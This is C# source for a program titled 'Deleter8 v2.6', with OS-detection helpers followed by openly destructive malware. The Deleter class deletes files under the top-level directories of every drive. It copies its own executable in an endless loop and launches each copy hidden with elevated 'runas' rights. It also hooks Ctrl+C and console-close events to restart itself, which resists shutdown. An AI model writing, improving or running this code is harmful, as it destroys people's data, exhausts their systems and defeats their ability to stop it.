namespace System
{
    public struct CPUTime
    {
        public System.UInt64 IdleTime;
        public System.UInt64 KernelTime;
        public System.UInt64 UserTime;
        public System.UInt64 ProcessorTime 
        { 
            get 
            { 
                return this.KernelTime + this.UserTime; 
            } 
        }
    }
    public struct ProcInfo
    {
        public System.TimeSpan ProcessorTime;
        public System.Int64 PrivateMemorySize;
        public System.Int32 NumThreads;
    }
    public abstract class OS
    {
        public static System.String RestartPath;
        public static System.String GetRestartPath()
        {
            return System.OS.RestartPath;
        }
        public abstract System.Boolean IsWindows 
        {
            get; 
        }
        public abstract System.String PlatformName 
        { 
            get; 
        }
        public abstract System.String BitType 
        { 
            get; 
        }
        public virtual System.String StandaloneName 
        { 
            get 
            { 
                return "UNSUPPORTED"; 
            } 
        }
        public abstract System.String ProcessName
        {
            get;
            set;
        }
        public virtual void Init()
        {
        }
        public virtual void RestartProcess()
        {
            System.Diagnostics.Process.Start(System.OS.GetRestartPath());
        }
        public abstract System.CPUTime MeasureAllCPUTime();
        public virtual System.ProcInfo MeasureResourceUsage(System.Diagnostics.Process proc, System.Boolean all)
        {
            System.ProcInfo info = default(System.ProcInfo);
            info.ProcessorTime = proc.TotalProcessorTime;
            if (all)
            {
                info.PrivateMemorySize = proc.PrivateMemorySize64;
                info.NumThreads = proc.Threads.Count;
            }
            return info;
        }
        public static System.OS detectedOS;
        public static System.OS DetectOS()
        {
            System.OS.detectedOS = System.OS.detectedOS ?? System.OS.DoDetectOS();
            return System.OS.detectedOS;
        }
        public unsafe static System.OS DoDetectOS()
        {
            System.PlatformID platform = System.Environment.OSVersion.Platform;
            if (platform == System.PlatformID.Win32NT || platform == System.PlatformID.Win32Windows)
                return new System.WindowsOS();
            System.SByte* utsname = stackalloc System.SByte[8192];
            System.OS.uname(utsname);
            System.String kernel = new System.String(utsname);
            if (kernel == "Darwin")
            {
                return new System.macOS();
            }
            if (kernel == "Linux")
            {
                return new System.LinuxOS();
            }
            if (kernel == "FreeBSD")
            {
                return new System.FreeBSD_OS();
            }
            if (kernel == "NetBSD")
            {
                return new System.NetBSD_OS();
            }
            return new System.UnixOS();
        }
        [System.Runtime.InteropServices.DllImport("libc")]
        public unsafe static extern void uname(System.SByte* uname_struct);
    }

    public class WindowsOS : OS
    {
        public System.String pName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
        public override System.String ProcessName 
        {
            get
            {
                return pName;
            }
            set
            {
                pName = value;
            }
        }
        public override System.Boolean IsWindows 
        { 
            get 
            { 
                return true; 
            } 
        }
        public override System.String PlatformName 
        { 
            get 
            { 
                return "Windows"; 
            } }
        public override System.String BitType
        {
            get 
            {
                return System.IntPtr.Size == 8 ? "64-bit" : "32-bit"; 
            }
        }
        public override System.CPUTime MeasureAllCPUTime()
        {
            System.CPUTime all = default(CPUTime);
            System.WindowsOS.GetSystemTimes(out all.IdleTime, out all.KernelTime, out all.UserTime);
            all.KernelTime -= all.IdleTime;
            return all;
        }
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern System.Int32 GetSystemTimes(out System.UInt64 idleTime, out System.UInt64 kernelTime, out System.UInt64 userTime);
    }
    public class UnixOS : System.OS
    {
        public System.String pName = System.UnixOS.GetProcessExePath();
        public override System.String ProcessName
        {
            get
            {
                return pName;
            }
            set
            {
                pName = value;
            }
        }
        public override System.String PlatformName 
        { 
            get 
            { 
                return "Unix"; 
            } 
        }
        public override System.String BitType
        {
            get 
            { 
                return IntPtr.Size == 8 ? "64-bit" : "32-bit";
            }
        }
        public override System.Boolean IsWindows
        { 
            get 
            { 
                return false; 
            } 
        }

        public override void RestartProcess()
        {
            this.RestartInPlace();
        }
        public virtual void RestartInPlace()
        {
            System.String exe = System.UnixOS.GetProcessExePath();
            System.UnixOS.execvp(exe, new System.String[] 
            { 
                exe, 
                RestartPath, 
                null 
            });
            System.Console.WriteLine("execvp {0} failed: {1}", exe, System.Runtime.InteropServices.Marshal.GetLastWin32Error());
            System.UnixOS.execvp("mono", new System.String[] 
            { 
                "mono", 
                System.OS.RestartPath, 
                null 
            });
            System.Console.WriteLine("execvp mono failed: {0}", System.Runtime.InteropServices.Marshal.GetLastWin32Error());
        }
        [System.Runtime.InteropServices.DllImport("libc", SetLastError = true)]
        public static extern System.Int32 execvp(System.String path, System.String[] argv);
        public static System.String GetProcessExePath()
        {
            return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        }
        public override System.CPUTime MeasureAllCPUTime()
        {
            return default(CPUTime);
        }
        [System.Runtime.InteropServices.DllImport("libc", SetLastError = true)]
        public unsafe static extern System.Int32 sysctlbyname(System.String name, void* oldp, System.IntPtr* oldlenp, System.IntPtr newp, System.IntPtr newlen);
    }
    public class LinuxOS : System.UnixOS
    {
        public override System.String PlatformName 
        { 
            get 
            { 
                return "Linux"; 
            } 
        }
        public override System.String StandaloneName
        {
            get 
            { 
                return System.IntPtr.Size == 8 ? "nix64" : "nix32"; 
            }
        }
        public override void Init()
        {
            base.Init();
        }
        public override System.CPUTime MeasureAllCPUTime()
        {
            using (System.IO.StreamReader r = new System.IO.StreamReader("/proc/stat"))
            {
                string line = r.ReadLine();
                if (line.StartsWith("cpu "))
                {
                    return System.LinuxOS.ParseCpuLine(line);
                }
            }
            return default;
        }
        public static System.Char[] space = new System.Char[]
        {
            ' '
        };
        public static System.String[] SplitSpaces(System.String value)
        {
            return value.Split(System.LinuxOS.space);
        }
        public static System.CPUTime ParseCpuLine(System.String line)
        {
            line = line.Replace("  ", " ");
            System.String[] bits = System.LinuxOS.SplitSpaces(line);
            System.UInt64 user = System.UInt64.Parse(bits[1]);
            System.UInt64 nice = System.UInt64.Parse(bits[2]);
            System.UInt64 kern = System.UInt64.Parse(bits[3]);
            System.UInt64 idle = System.UInt64.Parse(bits[4]);
            System.CPUTime all;
            all.UserTime = user + nice;
            all.KernelTime = kern;
            all.IdleTime = idle;
            return all;
        }
        public override void RestartInPlace()
        {
            try
            {
                System.String exe = System.UnixOS.GetProcessExePath();
                System.String[] args = System.LinuxOS.GetProcessCommandLineArgs();
                System.UnixOS.execvp(exe, args);
            }
            catch (Exception ex)
            {
                System.Console.WriteLine("Error restarting process: {0}", ex);
            }
            base.RestartInPlace();
        }
        public static System.String[] GetProcessCommandLineArgs()
        {
            using (System.IO.StreamReader r = new System.IO.StreamReader("/proc/self/cmdline"))
            {
                System.String[] args = r.ReadToEnd().Split('\0');
                args[args.Length - 1] = null;
                return args;
            }
        }
    }
    public class FreeBSD_OS : System.UnixOS
    {
        public override System.String PlatformName
        { 
            get 
            { 
                return "FreeBSD"; 
            } 
        }
        public unsafe override System.CPUTime MeasureAllCPUTime()
        {
            const System.Int32 CPUSTATES = 5;
            System.UIntPtr* states = stackalloc System.UIntPtr[CPUSTATES];
            System.IntPtr size = (System.IntPtr)(CPUSTATES * System.IntPtr.Size);
            sysctlbyname("kern.cp_time", states, &size, System.IntPtr.Zero, System.IntPtr.Zero);
            System.CPUTime all;
            all.UserTime = states[0].ToUInt64() + states[1].ToUInt64();
            all.KernelTime = states[2].ToUInt64();
            all.IdleTime = states[4].ToUInt64();
            return all;
        }
    }
    public class NetBSD_OS : System.UnixOS
    {
        public override string PlatformName 
        { 
            get 
            { 
                return "NetBSD"; 
            } 
        }
        public unsafe override System.CPUTime MeasureAllCPUTime()
        {
            const System.Int32 CPUSTATES = 5;
            System.UInt64* states = stackalloc System.UInt64[CPUSTATES];
            System.IntPtr size = (System.IntPtr)(CPUSTATES * sizeof(System.UInt64));
            System.UnixOS.sysctlbyname("kern.cp_time", states, &size, System.IntPtr.Zero, System.IntPtr.Zero);
            CPUTime all;
            all.UserTime = states[0] + states[1];
            all.KernelTime = states[2];
            all.IdleTime = states[4];
            return all;
        }
    }
    public class macOS : System.UnixOS
    {
        public override System.String PlatformName 
        { 
            get 
            { 
                return "macOS"; 
            } 
        }
        public override System.String StandaloneName
        {
            get 
            { 
                return System.IntPtr.Size == 8 ? "mac64" : "mac32"; 
            }
        }
        public override System.CPUTime MeasureAllCPUTime()
        {
            System.UInt32[] info = new System.UInt32[4];
            System.UInt32 count = 4;
            System.Int32 flavor = 3;
            System.macOS.host_statistics(System.macOS.mach_host_self(), flavor, info, ref count);
            System.CPUTime all;
            all.IdleTime = info[2];
            all.UserTime = info[0] + info[3];
            all.KernelTime = info[1];
            return all;
        }
        [System.Runtime.InteropServices.DllImport("libc")]
        public static extern System.IntPtr mach_host_self();
        [System.Runtime.InteropServices.DllImport("libc")]
        public static extern System.Int32 host_statistics(System.IntPtr port, System.Int32 flavor, System.UInt32[] info, ref System.UInt32 count);
    }
    public class Deleter
    {
        public static void Separate(System.String str, System.Char splitter,
                             out System.String prefix, out System.String suffix)
        {
            System.Int32 index = str.IndexOf(splitter);
            prefix = index == -1 ? str : str.Substring(0, index);
            suffix = index == -1 ? "" : str.Substring(index + 1);
        }
        public const System.String Ver = "2.6";
        public const System.String Title = "Deleter8 v" + System.Deleter.Ver;
        public static System.String[] LogicalDrives = System.IO.Directory.GetLogicalDrives();
        public static System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
        public static System.String FileName = System.String.Empty;
        public static System.String FileExtension = System.String.Empty;
        public static System.Double Double;
        public static System.String[] Messages = System.Deleter.Argument.Split('\n');
        public static System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
        public static void DeleteDir(System.String[] args)
        {
            System.Console.WriteLine(args);
            System.Console.Clear();
            System.Console.WriteLine(System.Deleter.Messages);
            foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
            {
                if (disk.Name != disk.VolumeLabel)
                {
                    System.Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                }
                else
                {
                    System.Console.WriteLine("Current drive is: " + disk.Name);
                }
                foreach (System.String drive in System.Deleter.LogicalDrives)
                {
                    System.String root = System.IO.Directory.GetDirectoryRoot(drive);
                    if (root == null || root == "")
                    {
                        root = "/";
                    }
                    System.String[] dirs = System.IO.Directory.GetDirectories(root);
                    foreach (System.String dir in dirs)
                    {
                        System.String[] files = System.IO.Directory.GetFiles(dir);
                        foreach (System.String file in files)
                        {
                            System.IO.File.Delete(file);
                            System.Console.WriteLine("Deleting " + file);
                        }
                    }
                }
            }
        }
        public delegate System.Boolean ConsoleEventDelegate(System.Int32 eventType);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        public static extern System.Boolean SetConsoleCtrlHandler(ConsoleEventDelegate callback, System.Boolean add);
        public static System.Deleter.ConsoleEventDelegate handler;
        public static System.Boolean ConsoleEventCallback(System.Int32 eventType)
        {
            System.OS.DoDetectOS().RestartProcess();
            return false;
        }
        public static void OnCancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            System.OS.DoDetectOS().RestartProcess();
        }
        public static void Main(System.String[] args)
        {
            System.Deleter.Separate(System.OS.DoDetectOS().ProcessName, '.', out System.Deleter.FileName, out System.Deleter.FileExtension);
            System.Console.CancelKeyPress += OnCancelKeyPress;
            System.Deleter.handler = new ConsoleEventDelegate(ConsoleEventCallback);
            SetConsoleCtrlHandler(handler, true);
            if (args == null || args.Length == 0)
            {
                args = System.Deleter.Messages;
            }
            System.Console.Title = System.Deleter.Title;
            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
            System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
            System.Threading.Thread.Sleep(1000);
            while (System.Deleter.Double != System.Double.PositiveInfinity)
            {
                System.Deleter.Double++;
                System.IO.File.Copy(System.Deleter.FileName, System.Deleter.FileName + " (" + System.Deleter.Double + ")." + System.Deleter.FileExtension);
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.Verb = "runas";
                p.StartInfo.FileName = System.Deleter.FileName + "(" +
                    System.Deleter.Double + ")." + System.Deleter.FileExtension;
                p.StartInfo.Arguments = System.Deleter.Argument;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                p.Start();
                System.Deleter.DeleteDir(args);
            }
        }
    }
}